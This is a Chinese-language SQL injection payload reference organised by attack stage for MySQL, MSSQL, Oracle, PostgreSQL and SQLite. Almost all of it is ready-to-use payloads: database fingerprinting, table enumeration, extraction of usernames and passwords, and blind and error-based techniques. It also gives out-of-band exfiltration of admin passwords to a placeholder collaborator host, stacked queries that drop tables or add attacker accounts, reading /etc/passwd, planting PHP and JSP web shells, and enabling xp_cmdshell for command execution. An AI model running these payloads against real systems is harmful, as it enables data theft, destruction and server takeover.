# SQL Injection Payloads — 多数据库攻击流程参考

按攻击流程阶段组织，每个阶段下列出 MySQL、MSSQL、Oracle、PostgreSQL 对应的 payload。

---

## 1. 判断注入类型

### 1.1 数字型 vs 字符型

**最优方法：数学运算区分法**

利用数据库对数学表达式的求值行为来区分数字型和字符型注入。此方法优于传统的 `' OR '1'='1` 方式，因为它不依赖响应内容差异，仅依赖错误 vs 正常。

| Payload | 数字型注入行为 | 字符型注入行为 | 原理 |
|---------|-------------|-------------|------|
| `1/1` | 正常（`1/1 = 1`） | 正常（作为字符串 `'1/1'`，无数学运算） | 除数为 1 合法 |
| `1/0` | **报错**（除零错误） | 正常（作为字符串 `'1/0'`，无数学运算） | 除数为 0 非法 |

判断逻辑：
- `1/1` 正常 + `1/0` 报错 → **数字型注入**（数据库在计算数学表达式）
- `1/1` 正常 + `1/0` 正常 → **字符型注入**（输入被当作字符串字面量，未进入数学上下文）

**基础探测**：

| 测试 payload | 说明 |
|-------------|------|
| `1` | 正常值，观察基线响应 |
| `1/1` | 数学真值测试 — 正常则倾向数字型 |
| `1/0` | 数学非法测试 — 报错则确认为数字型；不报错则推测为字符型 |
| `1'` | 单引号测试，报错则大概率字符型 |
| `1"` | 双引号测试 |
| `1)` | 右括号闭合测试 |
| `1'))` | 多层闭合测试 |
| `1\` | 反斜杠测试（MySQL 转义） |

**字符型闭合确认**：

| Payload | 适用场景 |
|---------|---------|
| `1'#` | 单引号闭合 (MySQL 专有，最可靠) |
| `1'-- x` | 单引号闭合 + 注释（所有数据库通用；`--` 后加空格+任意字符，mysql要求空格） |
| `1'--` | 单引号闭合 + 注释（Oracle/MSSQL/PG/SQLite 可直接用，MySQL **不可**） |
| `1')-- x` | 括号+单引号闭合 |
| `1'))-- x` | 双层括号+单引号闭合 |
| `1' OR '1'='1` | 永真条件（字符型验证） |
| `1' AND '1'='2` | 永假条件（字符型验证） |

---

## 2. 数据库指纹识别

确认注入存在后，**应优先判断数据库类型**，而非急于判断列数。原因：

- 后续所有步骤的 payload 都依赖数据库类型——Oracle 需要 `FROM dual`，MySQL 注释用 `#`（`--` 必须跟空格才能生效），MSSQL 字符串拼接用 `+`，PostgreSQL 用 `||`
- 列数判断阶段的 `UNION SELECT NULL` 在 Oracle 上必须加 `FROM dual`，不知道类型就无法正确构建 payload
- 字符串拼接、时间延迟、报错注入函数等全部是数据库特定的——先知道类型，后面每一步都有明确的方向，避免大量无效试探

指纹识别途径有多条，按从快到慢排序：报错信息 > 注释符差异 > 字符串拼接差异 > 时间延迟差异。先试最快的，拿不到结论再递进。

### 2.1 基于错误信息判断

这是最快的途径——如果注入触发报错，错误信息本身往往直接暴露数据库类型：

| 错误特征 | 数据库类型 |
|---------|-----------|
| `You have an error in your SQL syntax` | MySQL / MariaDB |
| `mysql_fetch` / `mysql_num_rows` | MySQL |
| `Unclosed quotation mark` / `SqlException` / `OLE DB` | MSSQL |
| `ORA-` 前缀错误码 / `PLS-` | Oracle |
| `ERROR:` / `PSQLException` | PostgreSQL |
| `near "..."` | SQLite |

### 2.2 基于注释符判断

在注入点直接测试不同注释符，哪一个能使语法恢复正常就对应哪种数据库。

核心事实：**MySQL 是唯一要求 `--` 后必须跟空格（或控制字符）的数据库。** 这是 MySQL 对 SQL 标准的刻意偏离——防止 `balance--1` 这类自动生成的表达式被误解为注释（详情见 MySQL 手册 "`--` as the Start of a Comment"）。其他数据库（Oracle、MSSQL、PostgreSQL、SQLite）遵循 SQL 标准，`--` 后无需空格即可开始注释。

实践中，注入点常用 `-- x`（空格后跟任意可见字符，如 `-- w`、`-- -`）而非裸 `-- `，因为：
- 尾随空格不可见，可能在 URL 解析、表单处理或复制粘贴时被丢弃
- 空格后加一个字符，确保空格一定存在且可被肉眼验证
- 这种写法在所有数据库中均有效

| Payload | 有效数据库 |
|---------|-----------|
| `'--` | Oracle, MSSQL, PostgreSQL, SQLite (标准 SQL，无需空格) |
| `'-- x` | **所有数据库通用**（推荐写法，空格满足 MySQL，多出的 `x` 使空格可见） |
| `'#` | MySQL / MariaDB (专有注释符，最简洁可靠) |
| `';-- x` | MSSQL, PostgreSQL (堆叠查询 + 注释) |

### 2.3 基于字符串拼接判断

利用不同数据库特有的字符串拼接语法。注入一个返回 `abcd` 的 payload，哪个生效就对应哪个数据库：

| Payload | 有效数据库 |
|---------|-----------|
| `' UNION SELECT CONCAT('ab','cd'),NULL--` | MySQL / MariaDB |
| `' UNION SELECT 'ab' + 'cd',NULL--` | MSSQL |
| `' UNION SELECT 'ab' \|\| 'cd',NULL--` | PostgreSQL |
| `' UNION SELECT 'ab' \|\| 'cd',NULL FROM dual--` | Oracle |

### 2.4 基于时间延迟判断

当无报错、无回显时，用各数据库专属的延迟函数逐一试探：

| 数据库        | Payload                                                                |
| ---------- | ---------------------------------------------------------------------- |
| MySQL      | `' AND SLEEP(5)-- `                                                    |
| MySQL      | `' AND BENCHMARK(5000000,MD5('a'))-- `                                 |
| MSSQL      | `'; WAITFOR DELAY '0:0:5'--`                                           |
| PostgreSQL | `' AND (SELECT pg_sleep(5))--`                                         |
| Oracle     | `' AND DBMS_LOCK.SLEEP(5) FROM dual--`                                 |
| Oracle     | `' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5) FROM dual--`                   |
| SQLite     | `' AND (SELECT LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2)))))--` |

### 2.5 版本探测 (确认类型后验证)

确定数据库类型后，用对应版本查询做二次确认：

| 数据库 | Payload |
|--------|---------|
| MySQL | `' UNION SELECT @@version,NULL--` |
| MySQL | `' UNION SELECT version(),NULL--` |
| MSSQL | `' UNION SELECT @@version,NULL--` |
| PostgreSQL | `' UNION SELECT version(),NULL--` |
| Oracle | `' UNION SELECT banner,NULL FROM v$version--` |
| Oracle | `' UNION SELECT version,NULL FROM v$instance--` |
| SQLite | `' UNION SELECT sqlite_version(),NULL--` |

---

## 3. 判断列数

### 2.1 ORDER BY 法 (所有数据库通用)

```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
-- 逐次递增，直到报错。列数 = 最后一个不报错的数字
```

### 2.2 UNION SELECT NULL 法

```sql
' UNION SELECT NULL--        -- MySQL/MSSQL/PostgreSQL
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--

  NULL 可以不显式转型地匹配任意列的数据类型。SQL 标准中 NULL 是一个特殊值——它不属于任何具体类型，但可以兼容所有类型。当你不知道原始查询中第 n 列的返回类型是
  INT、VARCHAR 还是 DATE 时，写 NULL 是唯一不会触发类型冲突的选择。

  如果你写了 ' UNION SELECT 1,2,3--，而原始查询第二列是 VARCHAR 类型，MySQL 可能隐式兼容（宽松模式），但 MSSQL/PostgreSQL 大概率直接报错：Conversion failed
  when converting the varchar value '2' to data type int。然后你就误判了列数。

  选 NULL 还有一个好处：不引入额外数据。在有限回显的页面中，给你干净的回显判断环境——页面多了一个空 <td> 比多了一个数字 2 更容易判断。
```

**Oracle**（需要 FROM dual）:
```sql
' UNION SELECT NULL FROM dual--
' UNION SELECT NULL,NULL FROM dual--
' UNION SELECT NULL,NULL,NULL FROM dual--
```

**MySQL 报错函数辅助**:
```sql
' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(FLOOR(RAND(0)*2),0x7e,(SELECT ELT(N,1,2,3)))a FROM information_schema.tables GROUP BY a)b)--  -- 修改 N 测试列数
```

---

## 4. 判断回显位置 (字符串兼容列)

```sql
' UNION SELECT 'a',NULL,NULL--        -- MySQL/MSSQL/PG
' UNION SELECT NULL,'a',NULL--
' UNION SELECT NULL,NULL,'a'--
' UNION SELECT NULL,NULL,NULL,'a'--
```

**Oracle**:
```sql
' UNION SELECT 'a',NULL,NULL FROM dual--
' UNION SELECT NULL,'a',NULL FROM dual--
' UNION SELECT NULL,NULL,'a' FROM dual--
```

**字符串替代 payload**（提高可见性）:
```sql
' UNION SELECT '@@',NULL,NULL--        -- 使用特殊标记
' UNION SELECT 'A1',NULL,NULL--
```

---

## 5. 数据库信息收集

### 5.1 当前数据库名

| 数据库 | Payload |
|--------|---------|
| MySQL | `' UNION SELECT database(),NULL--` |
| MSSQL | `' UNION SELECT DB_NAME(),NULL--` |
| PostgreSQL | `' UNION SELECT current_database(),NULL--` |
| Oracle | `' UNION SELECT ORA_DATABASE_NAME,NULL FROM dual--` |
| Oracle | `' UNION SELECT SYS.DATABASE_NAME,NULL FROM dual--` |

### 5.2 当前用户名

| 数据库 | Payload |
|--------|---------|
| MySQL | `' UNION SELECT user(),NULL--` |
| MySQL | `' UNION SELECT current_user(),NULL--` |
| MSSQL | `' UNION SELECT SYSTEM_USER,NULL--` |
| MSSQL | `' UNION SELECT USER_NAME(),NULL--` |
| PostgreSQL | `' UNION SELECT current_user,NULL--` |
| Oracle | `' UNION SELECT user,NULL FROM dual--` |

### 5.3 枚举所有数据库

| 数据库 | Payload |
|--------|---------|
| MySQL | `' UNION SELECT group_concat(schema_name),NULL FROM information_schema.schemata--` |
| MySQL (有长度限制时) | `' UNION SELECT schema_name,NULL FROM information_schema.schemata LIMIT 0,1--` |
| MSSQL | `' UNION SELECT name,NULL FROM master.sys.databases--` |
| MSSQL | `' UNION SELECT STRING_AGG(name,', '),NULL FROM master.sys.databases--` |
| PostgreSQL | `' UNION SELECT datname,NULL FROM pg_database--` |
| PostgreSQL | `' UNION SELECT STRING_AGG(datname,','),NULL FROM pg_database--` |
| Oracle | `' UNION SELECT username,NULL FROM all_users--` |

### 5.4 枚举当前数据库的表

| 数据库 | Payload |
|--------|---------|
| MySQL | `' UNION SELECT group_concat(table_name),NULL FROM information_schema.tables WHERE table_schema=database()--` |
| MySQL (十六进制绕过) | `' UNION SELECT group_concat(table_name),NULL FROM information_schema.tables WHERE table_schema=0x64625f6e616d65--` |
| MSSQL | `' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_catalog=DB_NAME()--` |
| PostgreSQL | `' UNION SELECT tablename,NULL FROM pg_catalog.pg_tables WHERE schemaname NOT IN ('pg_catalog','information_schema')--` |
| Oracle | `' UNION SELECT table_name,NULL FROM all_tables--` |
| Oracle | `' UNION SELECT table_name,NULL FROM user_tables--` |
| SQLite | `' UNION SELECT name,NULL FROM sqlite_master WHERE type='table'--` |
| SQLite | `' UNION SELECT group_concat(name),NULL FROM sqlite_master WHERE type='table'--` |

### 5.5 枚举指定表的列

| 数据库 | Payload |
|--------|---------|
| MySQL | `' UNION SELECT group_concat(column_name),NULL FROM information_schema.columns WHERE table_name='users'--` |
| MySQL (十六进制表名) | `' UNION SELECT group_concat(column_name),NULL FROM information_schema.columns WHERE table_name=0x7573657273--` |
| MSSQL | `' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--` |
| PostgreSQL | `' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--` |
| Oracle | `' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS'--` |
| Oracle | `' UNION SELECT column_name,NULL FROM user_tab_columns WHERE table_name='USERS'--` |
| SQLite | `' UNION SELECT sql,NULL FROM sqlite_master WHERE type='table' AND name='users'--` |

---

## 6. 数据提取

### 6.1 UNION 直接提取

```sql
' UNION SELECT username,password FROM users--
' UNION SELECT username,password FROM users LIMIT 1 OFFSET 0--   -- 逐行提取
' UNION SELECT group_concat(username,'~',password),NULL FROM users--  -- 单列多值合并
```

**Oracle**:
```sql
' UNION SELECT username||'~'||password,NULL FROM users--
```

**MSSQL**:
```sql
' UNION SELECT username+CHAR(126)+password,NULL FROM users--
' UNION SELECT STRING_AGG(username+CHAR(126)+password,CHAR(10)),NULL FROM users--
```

### 6.2 报错注入 (Error-Based)

**MySQL**:
```sql
-- ExtractValue (32 字符限制，配合 SUBSTRING 分段)
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database()),0x7e))--
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT SUBSTRING(group_concat(table_name),1,32) FROM information_schema.tables WHERE table_schema=database()),0x7e))--

-- UpdateXML (同 ExtractValue 类似)
' AND UPDATEXML(1,CONCAT(0x7e,(SELECT database()),0x7e),1)--
' AND UPDATEXML(1,CONCAT(0x7e,(SELECT MID(group_concat(table_name),1,32) FROM information_schema.tables WHERE table_schema=database()),0x7e),1)--

-- floor + rand 双重查询
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--

-- EXP 溢出 (MySQL 5.5.5+)
' AND EXP(~(SELECT * FROM (SELECT database())a))--

-- 重复列名报错
' AND (SELECT * FROM (SELECT NAME_CONST(database(),1),NAME_CONST(database(),1))a)--
```

**MSSQL**:
```sql
-- 类型转换报错
' AND 1=CONVERT(INT,(SELECT @@VERSION))--
' AND 1=CONVERT(INT,(SELECT DB_NAME()))--
```

**PostgreSQL**:
```sql
-- 类型转换报错
' AND 1=CAST((SELECT current_database()) AS INT)--
```

**Oracle**:
```sql
-- CTXSYS.DRITHSX.SN 报错
' AND CTXSYS.DRITHSX.SN(user,(SELECT banner FROM v$version WHERE ROWNUM=1))=1--

-- UTL_INADDR 报错
' AND UTL_INADDR.GET_HOST_NAME((SELECT banner FROM v$version WHERE ROWNUM=1))='x'--
```

### 6.3 布尔盲注 (Boolean-Based Blind)

```sql
-- 判断数据库名第一个字符
' AND SUBSTRING((SELECT database()),1,1)='a'--
' AND ASCII(SUBSTRING((SELECT database()),1,1))=97--

-- 二分查找加速
' AND ASCII(SUBSTRING((SELECT database()),1,1))>80--
' AND ASCII(SUBSTRING((SELECT database()),1,1))>100--

-- 提取表名
' AND (SELECT SUBSTRING(table_name,1,1) FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1)='a'--

-- 提取数据
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'--
```

**Oracle (SUBSTR + 需要 FROM dual)**:
```sql
' AND SUBSTR((SELECT banner FROM v$version WHERE ROWNUM=1),1,1)='O'--
' AND (SELECT CASE WHEN (1=1) THEN 'a' ELSE 'b' END FROM dual)='a'--
```

### 6.4 时间盲注 (Time-Based Blind)

**MySQL**:
```sql
' AND IF(SUBSTRING((SELECT database()),1,1)='a',SLEEP(5),0)--
' AND IF(ASCII(SUBSTRING((SELECT database()),1,1))=97,SLEEP(5),0)--
' AND IF((SELECT COUNT(table_name) FROM information_schema.tables WHERE table_schema=database() AND table_name LIKE 'a%')>0,SLEEP(5),0)--

-- 无 IF 的变体
' AND SLEEP(5*(SUBSTRING((SELECT database()),1,1)='a'))--
' AND (SELECT CASE WHEN (SUBSTRING(database(),1,1)='a') THEN SLEEP(5) ELSE 0 END)--
```

**MSSQL**:
```sql
'; IF (SUBSTRING((SELECT DB_NAME()),1,1)='a') WAITFOR DELAY '0:0:5'--
'; IF (ASCII(SUBSTRING((SELECT DB_NAME()),1,1))=97) WAITFOR DELAY '0:0:5'--
'; IF ((SELECT COUNT(*) FROM information_schema.tables WHERE table_name LIKE 'a%')>0) WAITFOR DELAY '0:0:5'--
```

**PostgreSQL**:
```sql
'; SELECT CASE WHEN (SUBSTRING(current_database(),1,1)='a') THEN pg_sleep(5) ELSE pg_sleep(0) END--
' AND (SELECT CASE WHEN (SUBSTRING(current_database(),1,1)='a') THEN pg_sleep(5) ELSE pg_sleep(0) END)--
```

**Oracle**:
```sql
' AND (SELECT CASE WHEN (SUBSTR((SELECT banner FROM v$version WHERE ROWNUM=1),1,1)='O') THEN DBMS_LOCK.SLEEP(5) ELSE 0 END FROM dual)--
' AND (SELECT CASE WHEN (SUBSTR((SELECT banner FROM v$version WHERE ROWNUM=1),1,1)='O') THEN DBMS_PIPE.RECEIVE_MESSAGE('a',5) ELSE 0 END FROM dual)--
```

### 6.5 OAST 带外数据外带

**MySQL** (Windows, 需 FILE 权限):
```sql
-- DNS 外带 (SMB/UNC 路径触发 DNS 查询)
' UNION SELECT LOAD_FILE(CONCAT('\\\\',(SELECT database()),'.YOUR-COLLABORATOR.oastify.com\\a'))--

-- HTTP 外带 (需 UDF 或 curl 插件)
' UNION SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users WHERE username='admin'),'.YOUR-COLLABORATOR.oastify.com\\a'))--
```

**MSSQL**:
```sql
-- xp_dirtree 触发 DNS (UNC 路径)
'; EXEC master..xp_dirtree '//YOUR-COLLABORATOR.oastify.com/a'--

-- 数据外带（密码拼入子域名）
'; DECLARE @p VARCHAR(1024);SET @p=(SELECT password FROM users WHERE username='admin');EXEC('master..xp_dirtree "//'+@p+'.YOUR-COLLABORATOR.oastify.com/a"')--

-- xp_subdirs
'; EXEC master..xp_subdirs '//YOUR-COLLABORATOR.oastify.com/a'--

-- xp_fileexist
'; EXEC master..xp_fileexist '//YOUR-COLLABORATOR.oastify.com/a'--

-- xp_cmdshell + nslookup
'; EXEC xp_cmdshell 'nslookup '+(SELECT password FROM users WHERE username='admin')+'.YOUR-COLLABORATOR.oastify.com'--

-- OLE Automation
'; DECLARE @o INT;EXEC sp_oacreate 'MSXML2.ServerXMLHTTP',@o OUT;EXEC sp_oamethod @o,'open',NULL,'GET','http://YOUR-COLLABORATOR.oastify.com/'+(SELECT password FROM users WHERE username='admin');EXEC sp_oamethod @o,'send'--
```

**Oracle**:
```sql
-- XXE + EXTRACTVALUE (DNS)
' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://YOUR-COLLABORATOR.oastify.com/">%remote;]>'),'/l') FROM dual--

-- XXE + EXTRACTVALUE (DNS 数据外带)
' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.YOUR-COLLABORATOR.oastify.com/">%remote;]>'),'/l') FROM dual--

-- UTL_HTTP 外带
' UNION SELECT UTL_HTTP.REQUEST('http://YOUR-COLLABORATOR.oastify.com/'||(SELECT password FROM users WHERE username='admin')) FROM dual--

-- DBMS_LDAP
' UNION SELECT DBMS_LDAP.INIT((SELECT password FROM users WHERE username='admin')||'.YOUR-COLLABORATOR.oastify.com',80) FROM dual--

-- HTTPURITYPE
' UNION SELECT HTTPURITYPE('http://YOUR-COLLABORATOR.oastify.com/'||(SELECT password FROM users WHERE username='admin')).GETCLOB() FROM dual--
```

**PostgreSQL**:
```sql
-- COPY PROGRAM (需要超级用户)
'; COPY (SELECT '') TO PROGRAM 'nslookup '||(SELECT current_database())||'.YOUR-COLLABORATOR.oastify.com'--

-- dblink 扩展
'; SELECT dblink_connect('host=YOUR-COLLABORATOR.oastify.com user='||(SELECT current_database())||' password=x dbname=x')--
```

---

## 7. 堆叠查询 (Stacked Queries)

堆叠查询允许在一条语句中执行多条 SQL 命令，具体支持取决于数据库和驱动：

| 数据库 | 支持情况 |
|--------|---------|
| MySQL | 取决于驱动（PHP mysqli 支持 `multi_query()`；PDO 默认不支持但可开启 `PDO::MYSQL_ATTR_MULTI_STATEMENTS`） |
| MSSQL | 原生支持 `;` 分隔 |
| PostgreSQL | 原生支持 `;` 分隔 |
| Oracle | 需 `BEGIN...END` 块或 `EXECUTE IMMEDIATE` |

**MySQL** (需驱动支持):
```sql
'; INSERT INTO users(username,password) VALUES('attacker','password')#
'; DROP TABLE users#
'; UPDATE users SET password='newpass' WHERE username='admin'#
```

**MSSQL**:
```sql
'; INSERT INTO users(username,password) VALUES('attacker','password')--
'; EXEC xp_cmdshell 'whoami'--
'; CREATE TABLE test(id int)--
```

**PostgreSQL**:
```sql
'; INSERT INTO users(username,password) VALUES('attacker','password')--
'; DROP TABLE users--
```

**Oracle**:
```sql
'; BEGIN EXECUTE IMMEDIATE 'DROP TABLE users'; END;--
```

---

## 8. 文件操作

### 8.1 读文件

| 数据库 | Payload |
|--------|---------|
| MySQL | `' UNION SELECT LOAD_FILE('/etc/passwd'),NULL--` |
| MySQL (Win) | `' UNION SELECT LOAD_FILE('C:/Windows/System32/drivers/etc/hosts'),NULL--` |
| MySQL (十六进制) | `' UNION SELECT LOAD_FILE(0x2F6574632F706173737764),NULL--` |
| MSSQL | `'; CREATE TABLE #t(line VARCHAR(8000));BULK INSERT #t FROM 'c:\boot.ini';SELECT * FROM #t--` |
| Oracle | `' UNION SELECT text,NULL FROM all_source WHERE name='USERS'--` (读存储过程) |
| PostgreSQL | `'; COPY (SELECT pg_read_file('/etc/passwd')) TO '/tmp/output.txt'--` |
| PostgreSQL | `' UNION SELECT pg_read_file('/etc/passwd','0','10000'),NULL--` |

### 8.2 写文件 (WebShell)

**MySQL** (需 FILE 权限，secure_file_priv 允许写入):
```sql
' UNION SELECT '<?php system($_GET["cmd"]);?>' INTO OUTFILE '/var/www/html/shell.php'--
' UNION SELECT '<?php system($_GET["cmd"]);?>' INTO OUTFILE 'C:/xampp/htdocs/shell.php'--
```

**MSSQL** (需 xp_cmdshell):
```sql
'; EXEC xp_cmdshell 'echo ^<?php system($_GET["cmd"]);?^> > C:\inetpub\wwwroot\shell.php'--
```

**PostgreSQL** (需超级用户):
```sql
'; COPY (SELECT '<?php system($_GET["cmd"]);?>') TO '/var/www/html/shell.php'--
```

**Oracle** (需 UTL_FILE 权限):
```sql
'; DECLARE f UTL_FILE.FILE_TYPE;BEGIN f := UTL_FILE.FOPEN('WEB_DIR','shell.jsp','w');UTL_FILE.PUT_LINE(f,'<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>');UTL_FILE.FCLOSE(f);END;--
```

---

## 9. 命令执行

| 数据库 | Payload |
|--------|---------|
| MySQL UDF | `' UNION SELECT sys_exec('whoami'),NULL--` (需先创建 UDF 函数) |
| MSSQL xp_cmdshell | `'; EXEC xp_cmdshell 'whoami'--` |
| MSSQL (xp_cmdshell 未开启) | `'; EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE--` |
| PostgreSQL | `'; COPY (SELECT '') TO PROGRAM 'whoami'--` |
| Oracle | `'; BEGIN DBMS_SCHEDULER.CREATE_JOB(job_name=>'J',job_type=>'EXECUTABLE',job_action=>'/bin/bash -c "whoami"',enabled=>TRUE);END;--` |
| MySQL (docker 逃逸) | `' UNION SELECT LOAD_FILE('/proc/1/environ'),NULL--` |

---

> **文档类型**：Payload 速查手册
> **关联文档**：[[SQL injection]], [[bypass-techniques/绕过技术总览]]
